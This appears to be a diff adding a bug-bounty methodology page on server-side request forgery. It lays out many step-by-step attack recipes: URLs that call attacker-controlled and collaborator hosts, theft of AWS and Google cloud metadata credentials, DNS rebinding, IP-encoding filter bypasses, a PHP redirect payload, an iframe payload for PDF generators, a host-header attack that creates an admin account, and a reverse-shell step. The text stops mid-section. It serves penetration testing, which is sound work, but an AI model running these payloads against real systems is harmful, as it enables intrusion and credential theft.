@@ -1,0 +1,2718 @@
+# Server Side Request Forgery
+
+## Check List
+
+## Methodology
+
+### Black Box
+
+#### SSRF In Next.js
+
+{% stepper %}
+{% step %}
+Go to the site that uses Next Js technology, right click and select View Page Source
+{% endstep %}
+
+{% step %}
+Search for `/_next/image?url=` and see if you see anything
+{% endstep %}
+
+{% step %}
+And send this request in the form below
+
+```url
+GET https://target/_next/image?url=https://attacker.com/p.png&w=100&q=75
+```
+{% endstep %}
+
+{% step %}
+Check if the server has hit our server or not, if it has hit, the vulnerability will be detected
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### SSRF vectors
+
+{% stepper %}
+{% step %}
+A common one. Think about functions where the application fetches something based on a URL — maybe an image importer or data fetcher. If the app is grabbing content from an external URL, you can bet it might be susceptible to SSRF, especially if there’s no proper validation. The idea here is to try feeding internal URLs like `http://localhost` or `http://127.0.0.1`
+{% endstep %}
+
+{% step %}
+Oh yes, file uploads. These can be sneaky. Imagine an application that lets users upload files — things like PDFs, SVGs, or even Office documents. If the backend processes these files, SSRF might be hiding here. You can try uploading files with embedded URLs pointing to internal services (Reference: The PDF Trojan Horse: Leveraging HTML Injection for SSRF and Internal Resource Access)
+{% endstep %}
+
+{% step %}
+Proxy Implementations: Proxies are interesting because they route requests through the server. If the application lets you send requests through a proxy and doesn’t validate the URLs strictly, you’ve got a shot at SSRF. This is especially true if it doesn’t sanitize user-supplied URLs. Try sending requests to internal services or other unauthorized endpoints and see what happens
+{% endstep %}
+
+{% step %}
+Server Status and Monitoring Features: Now, look for those features that allow you to check server status or application health. These functionalities often query internal services for status information — perfect spots for SSRF. If you find one, try manipulating the requests to hit internal endpoints or sensitive services
+{% endstep %}
+
+{% step %}
+File Storage Integrations: If your target integrates with third-party services like Google Drive, Amazon S3, or Dropbox, check if the app makes server-side requests to fetch or store files. These are excellent candidates for SSRF, as you can try manipulating the requests to fetch internal files or data from unauthorized services. By injecting a crafted URL into these integrations, you might access internal systems that were never meant to be exposed
+{% endstep %}
+
+{% step %}
+Path Parameters and Host Headers: Pay close attention to how path parameters and host headers are handled. If an application uses path parameters to construct server-side requests, that’s another spot to test for SSRF. Try manipulating the parameters to redirect requests to internal resources. Similarly, the host header might be leveraged to control where requests are sent. Test for any weaknesses here — you might be able to influence the destination of requests using the host header
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### Server-Side Request Forgery using Javascript allows to exfill data from Google Metadata
+
+{% stepper %}
+{% step %}
+Login to Platform Access `https://example.com/` and sign in with valid credentials
+{% endstep %}
+
+{% step %}
+Go to Creative Library, select New Creative
+{% endstep %}
+
+{% step %}
+Let's examine the program and go to the point where it receives a file from the media or a link or server and create a template/Image
+{% endstep %}
+
+{% step %}
+Replace Image in Template Click on an image in the template, select Replace, then choose Import
+{% endstep %}
+
+{% step %}
+Use Burp Suite to intercept the POST request to /api/v1/media/import with URL parameter set to http://attacker-controlled-domain/ssrf.html
+{% endstep %}
+
+{% step %}
+Run a Flask server on ssh.attacker-domain:5000 with endpoints for logging and timing delays
+{% endstep %}
+
+{% step %}
+Host ssrf.html on demon.attacker-domain:80 containing JavaScript to log timing, loop requests, and fetch metadata endpoints
+{% endstep %}
+
+{% step %}
+Submit the intercepted request with the malicious URL to initiate server-side fetch of ssrf.html
+{% endstep %}
+
+{% step %}
+Immediately after triggering, update DNS for attacker-controlled-domain to resolve to 169.254.169.254
+{% endstep %}
+
+{% step %}
+Wait 3 minutes and check timing server logs for exfiltrated data like SSH keys, service accounts, and hostname from Google Compute Engine metadata
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### SSRF via Remote\_Attachment\_Url injection in Export/Import Mechanism
+
+{% stepper %}
+{% step %}
+Create a new project/space on the target platform
+{% endstep %}
+
+{% step %}
+Create an importable item (e.g., an issue, ticket, record, or any model with notes/attachments) and add a note/entry to it
+{% endstep %}
+
+{% step %}
+Export the project/space using the platform’s export mechanism to generate the export file
+{% endstep %}
+
+{% step %}
+Extract the downloaded export archive
+{% endstep %}
+
+{% step %}
+In the export JSON (e.g., `project.json` or equivalent), locate the note/entry hash and add or set the `remote_attachment_url` field to an attacker-controlled URL (for example `"http://attacker-controlled-domain/payload"`). If available, also add/set header fields such as `remote_attachment_request_header`
+{% endstep %}
+
+{% step %}
+Recompress the export back into the original archive format and import the reconstructed export via the platform’s import mechanism
+{% endstep %}
+
+{% step %}
+After import completes, navigate to the imported item/note and view it so the platform creates the model and triggers any server-side download
+{% endstep %}
+
+{% step %}
+On the attacker-controlled server, check logs or callbacks to confirm the target server fetched the malicious URL and (if successful) exposed internal data/metadata or accessed local services
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### Webhook-Based SSRF via DNS Rebinding
+
+{% stepper %}
+{% step %}
+Log in to the platform and identify the platform points and if it has a Webhook, follow the steps below
+{% endstep %}
+
+{% step %}
+Create a webhook on the target platform for a repository/service/event
+{% endstep %}
+
+{% step %}
+Use an attacker-controlled domain as the webhook URL (e.g. http://990.hacker1.example)
+{% endstep %}
+
+{% step %}
+Wait about 10 seconds for DNS/TTL changes or CNAME switching to take effect
+{% endstep %}
+
+{% step %}
+Trigger the webhook using the platform’s test/send test payload option (e.g., for a Push event)
+{% endstep %}
+
+{% step %}
+After the webhook runs, check whether the server’s request returned content from internal services (e.g., http://169.254.169.254, http://127.0.0.1, or other local endpoints)
+{% endstep %}
+
+{% step %}
+Wait \~15 seconds between attempts to avoid DNS caching interference
+{% endstep %}
+
+{% step %}
+Use a chain of CNAME records on the attacker-controlled DNS to prevent caching and reliably change the request target
+{% endstep %}
+
+{% step %}
+Inspect attacker-controlled server logs to confirm the target server fetched the malicious URL and returned internal data
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### Full-Read SSRF — Local File Read And AWS Metadata (IMDS) Exfiltration via Base64-Encoded Path Parameter
+
+{% stepper %}
+{% step %}
+Full read SSRF in www.example.com that can leak aws metadata and local file inclusion
+{% endstep %}
+
+{% step %}
+Access Vulnerable Endpoint\
+Navigate to https://www.example.com/ro/ endpoint with base64-encoded path parameter
+{% endstep %}
+
+{% step %}
+ase64 encode "file:///home/abenavides/#.js" to `ZmlsZTovLy9ob21lL2FiZW5hdmlkZXMvIy5qcw==`
+
+and append /.js to URL
+
+```http
+https://www.example.com/ro/ZmlsZTovLy9ob21lL2FiZW5hdmlkZXMvIy5qcw==/-1430533899.js
+```
+{% endstep %}
+
+{% step %}
+Request Directory Listing\
+Submit request and observe response leaking contents of `/home/abenavides/` directory
+{% endstep %}
+
+{% step %}
+Leak System File Base64 encode "file:///etc/passwd#.js" to `ZmlsZTovLy9ldGMvcGFzc3dkIy5qcw==` and request
+
+```http
+https://www.example.com/ro/ZmlsZTovLy9ldGMvcGFzc3dkIy5qcw==/-1430533899.js
+```
+
+to extract file contents
+{% endstep %}
+
+{% step %}
+Trigger SSRF to Metadata Base64 encode "http://169.254.169.254/#.js" to `aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8jLmpz`and request
+
+```http
+https://www.example.com/ro/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8jLmpz/-1430533899.js  
+```
+{% endstep %}
+
+{% step %}
+Verify Internal Access Check response for AWS metadata contents, confirming SSRF exploitation
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### SSRF in GraphQL Query
+
+{% stepper %}
+{% step %}
+Configure Burp Collaborator to monitor incoming DNS and HTTP requests
+{% endstep %}
+
+{% step %}
+Submit GraphQL query with source parameter set to full URL
+
+```json
+{ allTicks(source: "http://your-collaborator-domain.burpcollaborator.net") }  
+```
+{% endstep %}
+
+{% step %}
+Observe DNS and HTTP requests hitting Burp Collaborator confirming SSRF
+{% endstep %}
+
+{% step %}
+Replace source with internal URLs like "http://localhost:8080" or "http://169.254.169.254" to scan internal network
+{% endstep %}
+
+{% step %}
+Confirm DNS resolutions and port connectivity without HTTP response visibility
+{% endstep %}
+
+{% step %}
+Use SSRF to map open ports and internal services for further vulnerability discovery
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### Image-Proxy SSRF
+
+{% stepper %}
+{% step %}
+Navigate to https://duckduckgo.com/iu?u=http://yimg.com/path and confirm successful response
+{% endstep %}
+
+{% step %}
+Try https://duckduckgo.com/iu?u=https://google.com and verify rejection
+{% endstep %}
+
+{% step %}
+Submit https://example.com/iu?u=http://127.0.0.1:6868/status/?q=http://yimg.com/ to bypass yimg.com check
+{% endstep %}
+
+{% step %}
+Test localhost ports (22, 25, 80, 443, 587, 6380, 6432, 6767, 6868, 8000) using
+
+```http
+https://example.com/iu?u=http://127.0.0.1:$PORT/?q=http://yimg.com/  
+```
+{% endstep %}
+
+{% step %}
+Request `https://example.com/iu?u=http://127.0.0.1:6868/status/?q=http://yimg.com/` and extract Redis URLs, ping times, and internal statistics
+{% endstep %}
+
+{% step %}
+Document successful internal service interactions confirming cross-origin port scanning capability
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### SSRF Chained To Hit Internal Host Leading To Another SSRF Which Allows to Read Internal Images
+
+{% stepper %}
+{% step %}
+Access Primary SSRF Endpoint Navigate to
+
+```http
+https://api.example.net/images/?format=png&image=https%3A//store.mgmt.example.net/store/api/chihiro/00_09_000/container/US/en/999/UP4134-CUSA00329_00-ONNTGAME00000001/1429722215000/image%3F_version%3D00_09_000%26platform%3Dchihiro%26w%3D225%26h%3D225%26bg_color%3D000000%26opacity%3D10
+```
+{% endstep %}
+
+{% step %}
+to fetch internal banner image from store.mgmt.example.com confirming SSRF to internal hosts
+{% endstep %}
+
+{% step %}
+Test Secondary SSRF Endpoint Access
+
+```http
+https://image.api.np.km.example.net/dis/images/?format=png&image=https%3A%2F%2Fdis.api.np.example.net%2Fdis%2Fv1%2Fbanners%3Fbackplate%3Dfile:////usr/share/pixmaps/system-logo-white.png%26dimensions%3D790x250%26price%3D%2436.99%26price_discount%3D%2424.41%26format%5B%5D%3DPS4%26type%3DF%22%3E%3Csvg%3Ebanner%3C/svg%3Eull+Game%26locale%3Den_CA%26cta%3DDownload+No%26output%3Dsvg%26tpl%3Dbanner-web-store%26store%3Dgame%26region%3Dus%26
+```
+{% endstep %}
+
+{% step %}
+Verify Local File Read , Confirm response contains rendered PNG of system-logo-white.png confirming local file extraction via dis.api.np.playstation.net banner service
+{% endstep %}
+
+{% step %}
+Test Internal Network Access\
+Modify image parameter to other internal PSN hosts (e.g., mgmt.\*.playstation.com) with valid image paths confirming broader SSRF capability
+{% endstep %}
+
+{% step %}
+Confirm Chained Exploitation\
+Document flow: image.api.np.km.playstation.net fetches from dis.api.np.playstation.net which reads file:// local image and overlays banner data confirming full LFI via SSRF
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### SSRF in Url Parameter
+
+{% stepper %}
+{% step %}
+Request File Storage Endpoint Send GET request to `https://couriers.example.com/api/file-storage?url=http://your-burp-collaborator.oastify.com`
+{% endstep %}
+
+{% step %}
+Monitor Burp Collaborator, Observe incoming HTTP interaction confirming SSRF execution
+{% endstep %}
+
+{% step %}
+Verify Response Content Check response body contains HTML from collaborator payload: `6zy5d1pwzab93qopx8jq2ezjigz`
+{% endstep %}
+
+{% step %}
+Test External Website Request `https://couriers.example.com/api/file-storage?url=https://www.google.com` and verify Google HTML displayed in response
+{% endstep %}
+
+{% step %}
+Test Internal Services
+
+Modify URL parameter to `http://localhost:8080` or `http://169.254.169.254` to access internal network
+{% endstep %}
+
+{% step %}
+Confirm Arbitrary Request Capability Document ability to fetch content from any external/internal host via unsanitized url parameter
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### CRLF injection & SSRF
+
+{% stepper %}
+{% step %}
+Setup Redis Server Configure Redis to listen on 127.0.0.1:6379
+{% endstep %}
+
+{% step %}
+Sign in to Platform, create a new project
+{% endstep %}
+
+{% step %}
+Navigate to project Settings -> Repository -> Mirroring repositories
+{% endstep %}
+
+{% step %}
+Capture POST request for adding mirror using Burp Suite
+{% endstep %}
+
+{% step %}
+Set project `[remote_mirrors_attributes][0][url]` to:
+
+```
+git://127.0.0.1/:2333/aaaaaaaaaaaaaaaa
+```
+
+in burp request to this
+
+```http
+git://127.0.0.1/aaa
+aaa
+aaa
+aa
+a {...}
+```
+{% endstep %}
+
+{% step %}
+Send POST to `/{username}/{project name}/mirror/update_now?sync_remote=true` to execute mirror action
+{% endstep %}
+
+{% step %}
+Listen on `118.89.198.146:8000` and confirm incoming reverse shell from GitLab server confirming RCE
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### [Blind SSRF — image/URL-Downloader Endpoint](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#blind-exploitation)
+
+{% stepper %}
+{% step %}
+Create Test Account Register a new test account on the platform
+{% endstep %}
+
+{% step %}
+Log In to Account Sign in using the created test account credentials, confirming redirection to https://exmaple.com/my/
+{% endstep %}
+
+{% step %}
+Navigate to Profile Edit Access the edit profile section from the user dashboard
+{% endstep %}
+
+{% step %}
+Locate User Picture Field Scroll to the user picture upload area and initiate the upload process
+{% endstep %}
+
+{% step %}
+Activate Burp Collaborator Launch Burp Collaborator client to monitor for incoming HTTP and DNS interactions
+{% endstep %}
+
+{% step %}
+Submit External URL Payload Enter a Burp Collaborator URL in the URL downloader field, appending /test.png (e.g., http://example.com/test.png), and submit
+{% endstep %}
+
+{% step %}
+Poll for Interactions Check Burp Collaborator for HTTP and DNS requests confirming Blind SSRF, noting internal IP address from interactions
+{% endstep %}
+
+{% step %}
+Enable Proxy and Intercept Activate Foxy Proxy to route traffic through Burp Suite
+{% endstep %}
+
+{% step %}
+Submit Localhost Payload Enter http://127.0.0.1/test.png in the URL downloader and submit, intercepting the POST request to /repository/repository\_ajax.php?action=signin
+{% endstep %}
+
+{% step %}
+Verify SSRF Confirmation Examine intercepted request containing file parameter and confirm response leaks server information (e.g., nginx, PHP/7.4.28) and embedded 404 response confirming Blind SSRF
+{% endstep %}
+
+{% step %}
+Test Port-Specific Leaks Modify payload to http://127.0.0.1:25/test.png and confirm response leaks Postfix SMTP server details confirming libcurl usage and broader SSRF capability
+
+```http
+POST /repository/repository_ajax.php?action=signin HTTP/1.1
+Host: example.com
+Cookie: MoodleSession=c5416a0e3ea3db1606b2876b0b6ac35f; RedirectDouble=1; MOODLEID1_=%25BA%2519V%25E8%25DA%2517
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+Accept: */*
+Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 295
+Origin: https://example
+Referer: https://example.com/user/edit.php
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+Connection: close
+
+file=http%3A%2F%2F127.0.0.1%2Ftest.png&
+repo_id=5&p=&page=&env=filemanager&
+accepted_types[]=.gif&accepted_types[]=.jpe&accepted_types[]=.jpeg&
+accepted_types[]=.jpg&accepted_types[]=.png&
+sesskey=h2ixtMF4Fv&client_id=6315fe93ef054&itemid=951353609&maxbytes=1073741824&areamaxbytes=-1&ctx_id=9398501
+```
+{% endstep %}
+
+{% step %}
+You will notice one error showing some info about server which confirms Blind SSRF again. The response looks like this
+{% endstep %}
+
+{% step %}
+```http
+HTTP/1.1 200 OK
+Server: nginx
+Date: Mon, 05 Sep 2022 14:05:32 GMT
+Content-Type: application/json; charset=utf-8
+Connection: close
+X-Powered-By: PHP/7.4.28
+Set-Cookie: RedirectDouble=1; path=/
+Set-Cookie: RedirectDouble=1; path=/
+Set-Cookie: RedirectDouble=1; path=/
+Set-Cookie: RedirectDouble=1; path=/
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: post-check=0, pre-check=0
+Pragma: no-cache
+Expires: Mon, 20 Aug 1969 09:23:00 GMT
+Last-Modified: Mon, 05 Sep 2022 14:05:32 GMT
+Accept-Ranges: none
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Content-Length: 261
+
+{"list":[],"nosearch":true,"norefresh":true,"nologin":true,"error":"HTTP\/1.1 404 Not Found\r\nServer: nginx\r\nDate: Mon, 05 Sep 2022 14:05:32 GMT\r\nContent-Type: text\/html; charset=utf-8\r\nContent-Length: 146\r\nConnection: keep-alive\r\n\r\n","repo_id":5
+```
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### SSRF — Timing-Based/Internal Port-Scanning via URL-Input Endpoints
+
+{% stepper %}
+{% step %}
+Identify URL Input Endpoint
+{% endstep %}
+
+{% step %}
+Locate API endpoint accepting user-supplied URLs (`POST /api/profile/upload_picture with "picture_url"` parameter)
+{% endstep %}
+
+{% step %}
+Submit Malicious Localhost URL
+{% endstep %}
+
+{% step %}
+Send request with: `{"picture_url": "http://localhost:8080"}`
+{% endstep %}
+
+{% step %}
+Measure Response Time
+{% endstep %}
+
+{% step %}
+Record time taken for server response to determine if port `8080` is open
+{% endstep %}
+
+{% step %}
+Test Multiple Ports
+{% endstep %}
+
+{% step %}
+Submit requests with `"http://localhost:PORT"` for ports `22`, `25`, `80`, `443`, `3000`, `8080`, `6379`
+{% endstep %}
+
+{% step %}
+Submit `"http://127.0.0.1:PORT"`, `"http://169.254.169.254/latest/meta-data/"`, `"http://10.0.0.1/admin"`
+{% endstep %}
+
+{% step %}
+Document open ports based on response times `(<2s = open, >10s = filtered, timeout = closed`)
+{% endstep %}
+
+{% step %}
+Confirm response contains AWS/GCP metadata when using `"http://169.254.169.254"` or equivalent
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### [Bypassing SSRF Protection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypass-using-different-encoding)
+
+{% stepper %}
+{% step %}
+Host a PHP file on attacker server with: and submit URL `http://attacker.com/redirect.php` to force server redirect to internal address
+{% endstep %}
+
+{% step %}
+Configure `A/AAAA` record for subdomain.attacker.com to resolve to `127.0.0.1` and submit `http://subdomain.attacker.com` to make server fetch from internal IP
+{% endstep %}
+
+{% step %}
+Replace IPv4 with equivalent IPv6 like `[::1]` for localhost and submit`http://[::1]` to evade IPv4 blacklist
+{% endstep %}
+
+{% step %}
+Convert 127.0.0.1 to `0x7f.0x0.0x0.0x1` and submit `http://0x7f.0x0.0x0.0x1` to bypass decimal checks
+{% endstep %}
+
+{% step %}
+Convert 127.0.0.1 to `0177.0.0.01` and submit `http://0177.0.0.01` to evade decimal blacklists
+{% endstep %}
+
+{% step %}
+Convert 127.0.0.1 to `2130706433` and submit `http://2130706433` to represent IP as single integer
+{% endstep %}
+
+{% step %}
+Encode "localhost" as `%6c%6f%63%61%6c%68%6f%73%74` and submit `http://%6c%6f%63%61%6c%68%6f%73%74` to slip past string filters
+{% endstep %}
+
+{% step %}
+Combine formats like `0177.0.0.0x1` for 127.0.0.1 and submit `http://0177.0.0.0x1` to confuse parsers
+{% endstep %}
+
+{% step %}
+If whitelist exists, find open redirect on whitelisted domain (e.g., whitelisted.com/redirect?url=http://127.0.0.1) and submit to bypass
+{% endstep %}
+
+{% step %}
+Create subdomain like victim.com.attacker.com or path attacker.com/victim.com and submit to exploit poor regex validation
+{% endstep %}
+
+{% step %}
+Hypothesize blacklist logic (e.g., regex for 127.0.0.1), design bypasses for assumed implementation, and test variants
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### [SSRF via Service-Import With 303-Redirect Bypass to Exfiltrate AWS IMDS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypassing-filters)
+
+{% stepper %}
+{% step %}
+SSRF via service-import with 303-redirect bypass to exfiltrate AWS IMDS
+{% endstep %}
+
+{% step %}
+Navigate to example.com and authenticate with a valid account
+{% endstep %}
+
+{% step %}
+Identify the import document functionality supporting Dropbox, OneDrive, GDrive, Box, and Evernote services
+{% endstep %}
+
+{% step %}
+Intercept the import request for Dropbox, modify file\_reference parameter to Burp Collaborator URL, and confirm 404 response indicating protection
+{% endstep %}
+
+{% step %}
+Switch to OneDrive import (service\_type=O), set file\_reference to Burp Collaborator URL, and verify incoming HTTP interaction confirming SSRF
+{% endstep %}
+
+{% step %}
+Observe PDF document generated in HelloSign containing collaborator page HTML confirming full response disclosure
+{% endstep %}
+
+{% step %}
+Try file\_reference=`http://169.254.169.254/latest/meta-data/` and `http://127.0.0.1` confirming 404 responses due to protection
+{% endstep %}
+
+{% step %}
+Review HackerOne report https://hackerone.com/reports/247680 for 303 redirect SSRF bypass method
+{% endstep %}
+
+{% step %}
+Deploy PHP script on attacker server:
+
+```php
+<?php header('Location: http://169.254.169.254/latest/meta-data/', TRUE, 303); ?>
+```
+{% endstep %}
+
+{% step %}
+Set file\_reference to attacker server URL `(http://attacker.com/redirect.php)` in OneDrive import request
+{% endstep %}
+
+{% step %}
+Confirm response contains AWS instance metadata including access keys and tokens confirming successful bypass
+{% endstep %}
+
+{% step %}
+Use extracted credentials to attempt AWS CLI commands like ec2 stop-instances --instance-ids i-instanceid, document insufficient permissions
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### SSRF Host Header Injection
+
+{% stepper %}
+{% step %}
+Send GET request to `https://abc.victim.com/` with `X-Forwarded-Host: A.com` and confirm 500 Internal Server Error
+{% endstep %}
+
+{% step %}
+Set X-Forwarded-Host: burp-collaborator.com and observe multiple incoming requests to Collaborator containing user cookies and authorization queries
+{% endstep %}
+
+{% step %}
+Deploy Node.js server on attacker.com to replay legitimate responses from abc.victim.com to SSRF requests
+{% endstep %}
+
+{% step %}
+Send GET https://abc.victim.com/ with X-Forwarded-Host: attacker.com and confirm successful login without 500 error
+{% endstep %}
+
+{% step %}
+Identify SSRF request with JSON `{"type": "user"}`, change to `{"type": "admin"}` on attacker.com server
+{% endstep %}
+
+{% step %}
+Access https://abc.victim.com/ with X-Forwarded-Host: attacker.com and confirm admin dashboard access with sensitive data visibility
+{% endstep %}
+
+{% step %}
+Navigate to 'Add New User' as admin, submit admin creation request despite 403 response
+{% endstep %}
+
+{% step %}
+Verify new admin account creation and login, demonstrating full organization control via new admin privileges
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### Query Wayback Machine for URLs
+
+{% stepper %}
+{% step %}
+Access `https://web.archive.org/cdx/search/cdx?url=.example.com/&output=text&fl=original&collapse=urlkey&filter=statuscode:200` to retrieve archived URLs from example.com
+{% endstep %}
+
+{% step %}
+Review output for API endpoints with parameters like getImage, url, path, and identify `/pdf-service?path=/test/testpage`
+{% endstep %}
+
+{% step %}
+Submit https://example.com/pdf-service?path=attacker.com and verify internal server error confirming validation
+{% endstep %}
+
+{% step %}
+Submit https://example.com/pdf-service?path=@attacker.com and confirm PDF contains Google page content confirming SSRF
+{% endstep %}
+
+{% step %}
+Submit https://example.com/pdf-service?path=@your-burp-collaborator.com and document incoming interactions revealing AWS EC2 IPs
+{% endstep %}
+
+{% step %}
+Submit https://example.com/pdf-service?path=@169.254.169.254/latest/meta-data/ and iterate across instances until confirming 200 status with AWS metadata in PDF
+{% endstep %}
+
+{% step %}
+Submit https://example.com/pdf-service?path=@internal-domain.com to discover internal domains and localhost ports like 3000 (Node.js)
+{% endstep %}
+
+{% step %}
+Note that localhost port scanning causes denial of service and cease further scanning to avoid disruption
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### [DNS‑Rebinding‑Assisted Blind SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypass-using-dns-rebinding)
+
+{% stepper %}
+{% step %}
+Locate GET `/test/?url=` parameter on redacted subdomain confirming potential SSRF
+{% endstep %}
+
+{% step %}
+Submit `url=http://your-burp-collaborator.com` and observe 501/503 errors across subdomains
+{% endstep %}
+
+{% step %}
+Configure Intruder with payloads
+
+```
+/latest/meta-data/hostname
+/latest/meta-data/ami-id
+/latest/meta-data/local-ipv4
+/latest/meta-data/public-ipv4
+/latest/meta-data/security-groups
+/latest/meta-data/instance-type
+```
+{% endstep %}
+
+{% step %}
+Configure DNS Rebindingss
+
+Use 7f000001.a9fea9fe.rbndr.us domain configured to resolve to
+
+127.0.0.1 (29/30 requests - blocked)\
+169.254.169.254 (1/30 requests - metadata access)
+{% endstep %}
+
+{% step %}
+Submit 30+ Intruder Requests Monitor for 200 OK responses containing JSON errors with AMI-ID and metadata confirming 1/30 success rate
+{% endstep %}
+
+{% step %}
+Verify Metadata Exfiltration Confirm successful responses contain\
+AMI-ID, hostname, local-ipv4, public-ipv4, security-groups, instance-type
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### Identify GraphQL Endpoint
+
+{% stepper %}
+{% step %}
+Locate GraphQL API endpoint (https://pwapi.ex2b.com/) supporting allTicks query
+{% endstep %}
+
+{% step %}
+Test Legitimate Query
+
+query :
+
+```json
+{ allTicks(symbol: "TSLA", source: "https://example.com") { symbol server source ask time bid } }
+```
+
+and verify normal response
+{% endstep %}
+
+{% step %}
+Confirm External SSRF , Replace source with Burp Collaborator
+
+```json
+{ allTicks(symbol: "TSLA", source: "https://your-collaborator.burpcollaborator.net/") { symbol server source ask time bid } }
+```
+{% endstep %}
+
+{% step %}
+Monitor Collaborator Interactions\
+Poll Burp Collaborator and confirm incoming DNS + HTTP GET requests proving SSRF
+{% endstep %}
+
+{% step %}
+Test GET Parameter Manipulation
+
+```json
+{ allTicks(symbol: "TSLA", source: "https://your-collaborator.burpcollaborator.net/?do=something&param=evil") { symbol server source ask time bid } }
+```
+
+and verify parameters reach server request
+{% endstep %}
+
+{% step %}
+Exploit Internal Network Access Submit source payloads :
+
+```http
+"http://127.0.0.1:8080/"  
+"http://localhost:3000/admin"  
+"http://169.254.169.254/latest/meta-data/"  
+"http://10.0.0.1/internal-api"  
+```
+{% endstep %}
+
+{% step %}
+Document DNS resolutions and connection attempts to internal IPs/ports confirming network probing capability
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### Full‑Read SSRF via PDF Generation Endpoint
+
+{% stepper %}
+{% step %}
+Navigate to `http://int.redacted.com/pdf.axd?url=example.com` and confirm PDF generation functionality
+{% endstep %}
+
+{% step %}
+Submit `url=https://evil.com` and verify PDF contains content from the external domain confirming lack of input validation
+{% endstep %}
+
+{% step %}
+Submit `url=http://your-interactsh-url` and monitor Interact.sh for incoming HTTP interaction confirming SSRF
+{% endstep %}
+
+{% step %}
+Document IP address from Interact.sh response belongs to AWS confirming cloud environment
+{% endstep %}
+
+{% step %}
+Submit `url=http://169.254.169.254/latest/meta-data/` and confirm response includes metadata confirming successful exfiltration
+{% endstep %}
+
+{% step %}
+Submit `url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance` and document leaked Access Key ID, Secret Access Key, and Session Token
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### [Blind SSRF with DNS Rebinding](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#blind-exploitation)
+
+{% stepper %}
+{% step %}
+Examine Burp Suite HTTP History for sensitive GraphQL requests after initial testing yields no bugs
+{% endstep %}
+
+{% step %}
+Locate POST `/agw/graphql?op=UrlReachableVerifierQuery` with variables`{"url": "http://example.com/"}`
+{% endstep %}
+
+{% step %}
+Replace url with Burp Collaborator domain and verify incoming HTTP requests from two Google Cloud IPs confirming Blind SSRF
+{% endstep %}
+
+{% step %}
+Note only `"url" and "__typename"` fields echoed back in JSON response limiting direct exploitation
+{% endstep %}
+
+{% step %}
+Test Google Cloud Metadata Header Attempt:
+
+```bash
+curl "https://example.internal/computeMetadata/v1/instance/image" -H "Metadata-Flavor: Google"
+```
+{% endstep %}
+
+{% step %}
+and confirm header requirement
+{% endstep %}
+
+{% step %}
+Modify query to include various fields after verifyUrlReachable: ... on UrlReachableResult `{ FUZZ __typename }`
+{% endstep %}
+
+{% step %}
+Change query to: `verifyUrlReachable(url: $url) { UrlReachable __typename }` and confirm "Reachable" echo in response
+{% endstep %}
+
+{% step %}
+Attempt Direct Metadata Bypass, Test `url="http://metadata.google.internal/computeMetadata/v1/"` and confirm `"Not_Reachable"` response
+{% endstep %}
+
+{% step %}
+Configure DNS Rebinding\
+Setup Ceye DNS rebinding with Google Cloud IP `(1xx.xxx.xxx.xxx)` to alternate between external and `169.254.169.254`
+{% endstep %}
+
+{% step %}
+Submit `url="http://rebinding-domain.ceye.io"` and confirm `"Reachable"` response proving bypass success
+{% endstep %}
+
+{% step %}
+Scan Internal Ports via Rebinding\
+Test `url="http://rebinding-domain.ceye.io:80"` → "Reachable"\
+Test `url="http://rebinding-domain.ceye.io:443"` → "Not\_Reachable"
+{% endstep %}
+
+{% step %}
+Capture evidence showing internal network probing: Port 80 open, others filtered confirming critical SSRF impact
+{% endstep %}
+
+{% step %}
+Include PoCs demonstrating DNS rebinding bypass and internal port scanning for review
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### PDF Generators <a href="#f2da" id="f2da"></a>
+
+{% stepper %}
+{% step %}
+Find any feature that generates a PDF from user-controlled HTML/content like
+
+* Invoice download
+* Report export
+* Resume/CV builder → PDF
+* Ticket → PDF
+* Quote/Order → Download PDF
+* “Print this page” → Save as PDF
+* Contract preview → PDF
+{% endstep %}
+
+{% step %}
+Confirm the PDF is generated server-side rendered (not client-side jsPDF)
+{% endstep %}
+
+{% step %}
+If the PDF takes 2–10 seconds to generate → almost always server-side
+{% endstep %}
+
+{% step %}
+Inject the most basic SSRF / local file-read payload in any user-editable field
+
+```html
+<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
+```
+{% endstep %}
+
+{% step %}
+Generate the PDF and open it → if you see AWS metadata (iam/security-credentials/role-name) → instant Critical SSRF
+{% endstep %}
+
+{% step %}
+If the generator blocks external URLs but allows internal, try local ports
+
+```html
